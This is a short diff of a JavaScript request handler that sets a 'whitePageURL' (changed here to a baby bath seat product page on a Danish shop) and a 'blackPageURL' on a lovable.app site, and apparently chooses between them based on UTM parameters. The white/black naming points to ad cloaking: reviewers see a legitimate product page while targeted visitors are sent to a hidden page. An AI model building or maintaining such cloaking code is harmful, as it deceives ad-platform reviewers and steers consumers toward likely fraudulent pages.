@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://cl.com/da-dk/p/komplett-sleepcarrier-x-sæt";
+    const whitePageURL = "https://zoneoffer.dk/en/product/baby-kids/baby-bathing/baby-bathtubs-bath-seats/angelcare-bath-seat-gray/666594201140";
     const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
